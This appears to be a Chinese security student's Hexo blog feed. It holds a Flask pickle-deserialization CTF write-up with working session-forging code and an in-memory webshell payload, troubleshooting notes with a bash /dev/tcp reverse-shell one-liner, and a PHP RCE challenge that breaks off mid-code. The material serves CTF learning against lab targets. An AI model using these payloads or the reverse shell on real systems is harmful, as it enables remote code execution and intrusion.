class="token keyword">import</span> pickle<span class="token keyword">import</span> base64User <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span>    <span class="token string">'__reduce__'</span><span class="token punctuation">:</span><span class="token keyword">lambda</span> o<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('shell')).read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>u <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token punctuation">)</span>pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>u<span class="token punctuation">)</span>pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"session="</span><span class="token punctuation">,</span> pickled_data<span class="token punctuation">)</span><span class="token comment">#然后发现内存马不管用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>弄reduce，还需要伪造session，过程和[HCTF 2018]admin一样。</p><pre class="line-numbers language-none"><code class="language-none">#在/file里先找到一个sessioneyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.Z9lpXA.xSrSW0ScktiDr6ZSkcd75hXSjkopython3 flask_session_cookie_manager3.py decode -s 'glzjin22948575858jfjfjufirijidjitg3uiiuuh' -c 'eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.Z9lpXA.xSrSW0ScktiDr6ZSkcd75hXSjko'得到{'u': b'\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94.'}按照该格式构造：python3 flask_session_cookie_manager3.py encode -s 'glzjin22948575858jfjfjufirijidjitg3uiiuuh' -t "{'u': b'gASVSAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwsX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC9wYXNzJymUhZRSlC4='}"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不知道为啥用工具生成的总是不对。。。最后用的python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface<span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">import</span> requestsapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'glzjin22948575858jfjfjufirijidjitg3uiiuuh'</span>session_serializer <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span>User <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span>    <span class="token string">'__reduce__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"__import__('os').system('cat /flag &gt; /pass')"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"b"</span><span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>session_serializer<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'u'</span><span class="token punctuation">:</span> b<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">curl -b "session=.eJw1x8EOgiAcgPFXaTwBpl7avFRSc5Ni4p_wJupiApODzsr57tmhw_fbvgVN6LAg9WO3iSpMOFh6ZCX5d-YlvRY90RA-ZwlN0LlX1mKoBfGDNJ7DZfuQypzbWVp9ah2dSlfJTrST7ClVZuT04a1Io1nYZlZ4eHOnDcNkL1wQ1cTHrBgz9rGhAH3rjI8VwCBsxlWa4ztLErSu6xcjrzoA.Z9mBxg.P34L5iJKHY-pGfzV6xRtn7-RO_E" http://0d3edea2-7d43-41e1-a8f6-96c9aec28205.node5.buuoj.cn:81/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回500报错，但是命令已经执行</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6025514ec376985641eb50b81f9be0a8.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些其他的</title>
      <link href="/2025/02/13/pwncat/"/>
      <url>/2025/02/13/pwncat/</url>
      
        <content type="html"><![CDATA[<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>写一下遇到的问题：<br>kali中dirsearch无法使用python3版的可能是没更新(python开头的有的扫不到）<br>输入Y后显示install失败<br>在终端中输入&nbsp;sudo apt -y update&nbsp;和&nbsp;sudo apt -y upgrade&nbsp;来更新软件包列表并升级已安装的软件包。<br>用tplmap要用python2（用了pip2<br>然后版本太新可能用pip3安装依赖时会error提示<br><a href="https://">https://www.yaolong.net/article/pip-externally-managed-environment/</a><br><del>喵的要死了</del><br>感觉还得再优化下弄两个虚拟坏境。。。</p><p>dirseach429请求过多无法正常运行<br>Skipped the target due to 429 status code<br>可加后缀 –max-rate=10之类的降低速率</p><p>kali无法ping github.com<br><a href="https://">https://www.cnblogs.com/byErichas/p/15765816.html</a><br>sudo vim /etc/hosts<br>140.82.113.4 github.com<br>199.232.69.194 github.global.ssl.fastly.net<del>（以前好像在外面用过但还是watt toolkit好用</del><br>E直接编辑，i插入，ctrl+c退出，:wq!保存</p><p>kali仍无法git clone<br>可能是代理问题哈<br><a href="https://">https://blog.csdn.net/qq_31267769/article/details/107017322</a></p><p>请求查询参数（GET)请求主体参数（POST）</p><p>云服务器往近了选（是谁住在山西选的广州哈哈哈</p><p>ssh连linux是root为用户名！！！Administrator是windows的（哭</p><p>比起FinalShell什么的似乎mac终端/MobaXterm(Windows)更好？</p><p>远程用ToDesk</p><p>systemctl restart sshd</p><p>history|grep git(查找历史有git的命令）</p><p>flask:<br><a href="https://">https://tutorial.helloflask.com/hello/</a><br>安装flask的版本是最好按这个上面书上说的，安装2.1.3，而不是最新版本。因为他后面讲数据库的时候，他会要你安装，二点几的SQL alchemy，最新的已经到三点多了，会跟数据库那个出冲突。如果你已经安装了三点多，需要降级flask跟werkzeug，具体操作自己问ai。<br>. env/bin/activate  （激活虚拟环境）deactivate(退）<br>./pycharm.sh（运行pycharm)<br>pycharm中flask（我的本机pycharm上有插件,但kali安装的没有（提一嘴我这种操作没必要，在windows上弄就行<br><a href="https://">https://www.cnblogs.com/pysele/p/12459134.html</a><br> 注意app.py需在确保当前目录是项目的根目录下。(watchlist)<br>@app.route(‘/‘): / 对应的是主机名后面的路径部分<br>nano .gitignore（编辑） Control + O 和 Enter 键保存，然后按下 Control + X 键退出（我更用惯vim<br>当 python-dotenv 安装后，Flask 会从项目根目录的 .flaskenv 和 .env 文件读取环境变量并设置。<br>touch 命令创建touch .env .flaskenv。.flaskenv 用来存储 Flask 命令行系统相关的公开环境变量；而 .env 则用来存储敏感数据<br>上传图片需纯净url可访问（当然用静态文件的话就不用，用css调，换class），用width=”350” height=”200”之类的调大小<br><img src="https://pick.lwzheng.tech/2025/01/21/678f356627896.png" alt="3dda50312a9b80b6201a94ff0187b586.png"><br>这个后续记得删除，不然会覆盖<br>还有就是模板中寻找链接的图片，好像会从头开始寻找。尽管我把一个名为donk.png图片放在static的下面，在实际中，它仍然显示的是我位于image文件夹（在static文件夹下）下的donk1.png（因为我image文件夹在图片donk.png前面）<br>而当我把donk.png改为dooonk.png就可以正确显示了<br>因此我认为最好不要往文件名加入数字(似乎会混淆）<br>用ctrl+D退出flask shell<br>在创建里向数据库中添加记录中加from app import db（出现<br>db.session.add(user)<br>Traceback (most recent call last):<br>  File “<console>“, line 1, in <module><br>NameError: name ‘db’ is not defined报错的话），导入db对象，不知道为啥文里没写。<br>&lt;模型类&gt;.query.&lt;过滤方法（可选）&gt;.&lt;查询方法&gt;<br>用 @app.cli.command() 装饰器来注册。。 函数。flask xxx<br><del>终于体验到程序员改bug的崩溃了，修了好多次（</del><br>用PythonAnywhere注册时需要挂个梯子<br>我第一次显示dotenv 模块没有被找到，重装了一遍虚拟环境后可了<br>还有就是它可能版本比较低，安requirement.txt时有的版本没有（我的都是最新版本的),得自己改一下再下<br><a href="https://qing777.pythonanywhere.com/">https://qing777.pythonanywhere.com/</a></module></console></p><p>git add .不了可能是多创了一个/watchlist文件夹<br>git push失败：致命错误：无法读取远程仓库。请确认您有正确的访问权限并且仓库存在。<br>可能是url后没加.git<br>或者将远程仓库删除后重新remote一遍<br>git branch -M main ，git remote add origin <a href="mailto:git@github.com">git@github.com</a>:lingqing777/watchlist.git，git push -u origin main</p><p>picgo下载后打不开，发现在右下角托盘里点可<br><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/51b06b3e24060e1e1d79d317fc77e2d8.png"><del>(这测试链接的图片也太抽象了吧</del></p><p>有的人github图床不稳定猜想是steam++（改hosts)的问题，我的暂时观察还行，建议用vpn稳定些</p><p>phpstudy的话var_dump(scandir(chr(47)));读取根目录竟然是 D盘（</p><p><strong>将VMware Network Adapter VMnet8的IP改为与虚拟机IP同一网段</strong></p><p><a href="https://blog.csdn.net/weixin_52555162/article/details/121036987">kali 使用命令ifconfig查询ip地址一直为127.0.0.1的解决办法_kali的ip地址是127.0.0.1-CSDN博客</a></p><p><a href="https://www.cnblogs.com/TreeSky/p/17330560.html">VMware 主机(宿主)电脑访问虚拟机的服务—配置网络连接方式 - dong瓜(TreeSky) - 博客园</a>且<code>app.run(host = '0.0.0.0')</code></p><p><a href="https://www.cnblogs.com/z9m8r8/p/15187295.html">Kali Linux 不能联网上网 解决方法汇总（搬运） - z9m8r8 - 博客园</a></p><p><a href="https://blog.csdn.net/ww1473345713/article/details/51490525">【Linux】NAT模式下关于主机ping不通虚拟机的问题_nat模式主机ping虚拟机超时-CSDN博客</a></p><p>我的是本机pingkali超时，然后重启解决（</p><p>我说实话%90的问题重新启动可解决（</p><p><a href="https://blog.csdn.net/m0_52316372/article/details/125748020">Typora打开md文档出现乱码？一步搞定！_为什么以md结尾的文件修复后内容乱码-CSDN博客</a></p><p>图床上传typora无法显示，重新截图再上传，也可能是网管代理上传失败了（</p><p>burpsuit是啥，不认识，我只对yakit一心一意（渣渣灰</p><p>ctrl+A全选</p><p><del>这么看来遇到这么多问题真是太惨了（哭</del></p><hr><p>有生之年一定要搞个歌单狠狠宣传一下我宣的宝藏歌手^_^</p><p>其他的一些再说吧，先放到这，又要消失了（</p><hr><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><a href="https://blog.pcat.cc/%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/%E6%95%B0%E5%AD%A6%E8%BF%90%E7%AE%97%E3%80%81%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/cyberchef">pcat.cc</a></p><p>用联想浏览器打开CyberChef会出些意外，换个浏览器就好了</p><p>初次使用劫持工具无法达到想要的响应是认证问题</p><p>当前无法使用此页面<br>cn.bing.com 重定向你太多次。<a href="https://yebd1h.smartapps.cn/pages/blog/index?blogId=140184414&amp;_swebfr=1&amp;_swebFromHost=baiduboxapp">CSDN编程社区</a></p><p><a href="https://blog.csdn.net/lanlangaogao/article/details/122535848">Edge 修改字符编码（详细图文）_edge浏览器编码设置-CSDN博客</a></p><p>win10更新后edge找不到服务器，Microsoft Edge 使用你当前的服务提供商，改成使用当前的服务提供商。好多次拒绝我就换个（渣</p><p>Requestbin<a href="https://www.cnblogs.com/li9club/p/12381847.html">介绍两个调试http/https交互的模拟工具之一：使用requestbin的HTTPBin检查你发送的数据 - li9club - 博客园</a></p><p>1.我之前用过的云服务器都是linux跟windows一体的，可以直接ssh连上；并且我其实不太清楚ssh的原理，还以为只要B机单向安装ssh即可（。此次使用了win的实例，便由此造成了困扰。<br>2.开启ssh服务用这个也许会更方便<a href="https://zhuanlan.zhihu.com/p/2882095347">https://zhuanlan.zhihu.com/p/2882095347</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/28696f4c20a14f696c31be464e9cca57.png"></p><p>3.关于用户名Administrator试了一下，首字母小a与大A都可以。<br>4.我有win实例，还要ssh确实是自找烦恼，我连上后，想再试一遍，显示Permission denied，还得去改，有一种在powershell上用linux的美（</p><p>但没事可以改（</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a38e6932da29acb932ecb42112b2ba60.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a548572be0cbe9adfec9826fd2ad2adc.jpg"></p><p><a href="https://xz.aliyun.com/news/8987?time__1311=Yq0x2D0DnQG=qGNenDUrxIxxRxg2qYDcioD&amp;u_atoken=2f55c9ea5d650a6d777fe2d86b85f621&amp;u_asig=1a0c399717430900032761485e004c">文章 - 反弹Shell，看这一篇就够了 - 先知社区</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/301c3d2a070dc26db9c1ac720190b2c3.png"></p><pre class="line-numbers language-none"><code class="language-none">bash -c "bash -i &gt;&amp; /dev/tcp/x.xxx.xxx.xxx/7777 0&gt;&amp;1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://blog.csdn.net/qq_43199509/article/details/120028288">反弹shell失败 原来是这个原因_反弹shell时kali监听不到端口数据怎么办-CSDN博客</a></p><p>pycharm下不了库可以把代理关了再下试试。</p><p>[<a href="https://blog.csdn.net/ted_guangda/article/details/129010030">问题解决][edge]你现在无法访问 XXX.com，因为网站使用的是 HSTS。网络错误和攻击通常是暂时的，因此该页面以后可能会恢复正常。_因为网站使用的是 hsts。网络错误和攻击通常是暂时的,因此该页面以后可能会恢复正-CSDN博客</a></p><hr><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre class="line-numbers language-none"><code class="language-none">wsl.exe -d Ubuntu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://learn.microsoft.com/zh-cn/windows/wsl/tutorials/wsl-containers">https://learn.microsoft.com/zh-cn/windows/wsl/tutorials/wsl-containers</a></p><pre class="line-numbers language-none"><code class="language-none"> 1、docker pull openresty/openresty:alpine  2、docker build -t magic-mirror .  3、 docker imagesREPOSITORY            TAG       IMAGE ID       CREATED          SIZE&lt;none&gt;                &lt;none&gt;    0beeea22be24   10 minutes ago   319MB4、 docker run -d --name ctfprofile -p 8080:80 0beeea22be24docker run -d --name mirror -p 8081:8080 0beeea22be24docker run -d --name mirror -p 8081:8888 38f387eaaac1d251dd8e43c3e2e1fa24f668979a75b8fdc9723e25c3b6fc6370692e133c6c0b（容器 ID )或 docker run --rm -p 8081:8080 -e GZCTF_FLAG='flag{YOUR_REAL_FLAG}' magic-mirror*docker ps（检测是否成功）CONTAINER ID   IMAGE          COMMAND                   CREATED          STATUS          PORTS                                     NAMESd251dd8e43c3   0beeea22be24   "/docker-entrypoint.…"   18 seconds ago   Up 17 seconds   0.0.0.0:8080-&gt;80/tcp, [::]:8080-&gt;80/tcp   ctfprofile5、Start-Process "http://localhost:8080"(powershell)start http://localhost:8081(cmd) 6、docker logs -f ctfprofile   # 创建临时容器检查//docker run --rm -it mirror sh//~ $ ls//ctf-app     robots.txt//~ $ exitdocker tag mirror q1n9g/hashctf-mirror:latest（改标签）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">D:\Desktop\ctf\出题\1&gt;docker-compose up -d --build[+] Running 2/2 ✔ Network 1_mikus-network  Created                                                                                0.1s ✔ Container mikus-blog     Started                                                                                0.5sD:\Desktop\ctf\出题\1&gt;docker logs -f mikus-blogdocker exec -it mikus-blog bashdocker compose downdocker compose build --no-cachedocker compose up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>映射到8081即可，用内置浏览器</p><p><a href="https://www.lamber-maybe.com/2024/10/14/Burp%E6%8F%92%E4%BB%B6%E4%B9%8BParam-Miner/">Burp插件之Param-Miner | Lamber’s Blog</a></p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1::1localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><a href="http://blinkfox.com/2018/09/28/qian-duan/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/">http://blinkfox.com/2018/09/28/qian-duan/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/</a></p><p><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md</a></p><p><a href="https://sulawesi02.github.io/2024/08/17/2024-08-17-%E4%BD%BF%E7%94%A8-Hexo-+-GitHub-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">使用 Hexo + GitHub 搭建个人博客 - Sulawesi02’s Blog</a></p><p><a href="https://zhuanlan.zhihu.com/p/60578464">(1 封私信 / 34 条消息) 使用 Hexo+GitHub 搭建个人免费博客教程（小白向） - 知乎</a></p><p>公钥：</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\16256\.ssh、id_rsa.pubhexo ghexo shexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/blinkfox/hexo-theme-matery/issues/919">https://github.com/blinkfox/hexo-theme-matery/issues/919</a></p><hr><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre class="line-numbers language-none"><code class="language-none">go env -w GOPROXY=https://goproxy.cn,directgo env GOPROXY# 输出应为：https://goproxy.cn,directgo get -u github.com/gin-gonic/gingo run .php -S localhost:8000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><pre class="line-numbers language-none"><code class="language-none">pip因 SSL 协议错误无法下载如果你正在使用代理（如系统代理、VPN、Clash 等），尝试临时关闭所有代理工具，然后重新安装：原因：部分代理会修改 HTTPS 流量，导致 SSL 握手时协议不匹配（如强制使用低版本 TLS 或拦截证书）。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><a href="https://blog.csdn.net/Myon5/article/details/141788308">使用 GZCTF 结合 GitHub 仓库搭建独立容器与动态 Flag 的 CTF 靶场+基于 Docker 的 Web 出题与部署+容器权限控制_gzctf动态flag-CSDN博客</a></p><p><a href="https://github.com/settings/tokens">Personal Access Tokens (Classic)</a></p><pre class="line-numbers language-none"><code class="language-none">docker tag q1n9g/mikus-blog:latest ghcr.io/lingqing777/mikus-blog:latestdocker tag magic-mirror:latest ghcr.io/lingqing777/magic-mirror:latestecho [GitHub Personal Access Token (ghp)] | docker login ghcr.io -u lingqing777 --password-stdinLogin Succeededdocker push ghcr.io/lingqing777/mikus-blog:latestdocker push ghcr.io/lingqing777/magic-mirror:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>localhost和127.0.0.1不互通的看<code>C:\Windows\System32\drivers\etc\hosts</code>。检查文件中是否有一行 <code>127.0.0.1 localhost</code>，且未被 <code>#</code> 注释（<code>#</code> 开头的行为注释，无效）。 </p><p>yakit不代理127.0.0.1的</p><pre class="line-numbers language-none"><code class="language-none">解决方法：强制让 127.0.0.1 走 Yakit 代理1. 针对 Firefox 浏览器的配置（关键步骤）Firefox 有专门的配置项控制本地地址是否走代理，需要手动修改：打开 Firefox，访问 about:config（点击 “接受风险并继续”）。搜索并修改以下配置：network.proxy.allow_hijacking_localhost双击该选项，将值从 false 改为 true（允许代理劫持本地地址，即让 127.0.0.1 走代理）。network.proxy.no_proxies_on确保该选项的值为空（默认可能包含 localhost,127.0.0.1，需要删除这些内容，避免排除本地地址）。重新进入 Firefox 代理设置（about:preferences#general → 网络设置 → 设置），确认：手动配置代理为 127.0.0.1 和 Yakit 的监听端口（如 8080）。“不使用代理的地址” 输入框为空（无任何内容）。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><a href="https://dev59.com/superuser/DUnSa4cB1Zd3GeqPKg6s">如何在Windows子系统中重置Kali Linux密码 kali-linux windows-subsystem-for-linux password-recovery - Dev59</a></p><p>尽管蚁剑配置代理<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/51c95d4660efec808d025135eddcb5d6.png"></p><p>测试公网不成功，但连码还是可以，这是因为咱们一般靶场都是http，公网是https,测试链接靶场是可以成功的。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0d4b050ae976b74ad5f2de51c4d00b6e.png"></p><p>蚁剑连不上本地可能是防火墙没关<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6c2e37cdfd3242011b2f2afa6e0705fc.png"></p><blockquote><p><code>mitmdump -p 8089</code></p><p>本地起个代理服务器后</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d8d5d867d46f021c7232145326f07da1.png"></p><p>用mitmdump确实需要配置代理，因为他就像bp一样会劫持/解密 https 流量，所以你浏览器要配置证书。我来讲一下为啥渗透中不用配置证书：因为我们stowaway用http代理、socks代理的话。stowaway 的 HTTP 代理只做流量转发，不做中间人解密。SOCKS 代理本身就是纯转发协议，也不用配置证书。所以实际上浏览器会直接和目标网站建立 TLS 加密连接，不会有中间人解析这个包看看，再自己加密</p><hr><p>[<a href="https://www.cnblogs.com/johnnyzen/p/17880870.html">Git] 一次搞定：Github 2FA(Two-Factor Authentication/两因素认证) - 千千寰宇 - 博客园</a>d</p><p><a href="https://github.com/SummerSec/ShiroAttack2/issues/41">报错：找不到或无法加载主类 com.summersec.attack.UI.Main · Issue #41 · SummerSec/ShiroAttack2</a>d</p><p>听说这个pwn工具挺好用的</p><p><a href="https://github.com/calebstewart/pwncat">calebstewart/pwncat: Fancy reverse and bind shell handler</a></p><p><a href="https://www.freebuf.com/articles/system/306294.html">pwncat：功能强大的反向Shell&amp;BindShell处理工具 - FreeBuf网络安全行业门户</a></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其他题2（队）</title>
      <link href="/2025/02/05/2-yue-5-ri/"/>
      <url>/2025/02/05/2-yue-5-ri/</url>
      
        <content type="html"><![CDATA[<h3 id="简单的RCE"><a href="#简单的RCE" class="headerlink" title="简单的RCE"></a>简单的RCE</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moran'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'task'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>​    <span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'task'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>​    <span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>​    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|eval|assert|call|create|preg|sort|{|}|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i'</span><span class="token punctuation">,</span><span class="token variable">$str1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">19</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/please_give_me_flag/'</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">#由下可知要执行$_POST['task']要有please_give_me_flag，而且preg_match有i的！（无大小写限制，故混写即可绕过）且某字符串正好长19（</span>​      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>​      <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/please_give_me_flag/ei"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'task'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span 